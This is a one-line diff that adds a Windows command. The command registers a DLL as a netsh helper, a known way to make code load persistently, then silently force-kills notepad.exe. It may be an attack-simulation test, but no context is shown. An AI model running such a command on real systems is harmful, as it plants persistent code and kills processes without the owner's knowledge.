@@ -1,0 +1,1 @@
+netsh.exe add helper "08497f_NetshHelper.dll" && taskkill /im notepad.exe /t /f > NUL 2>&1
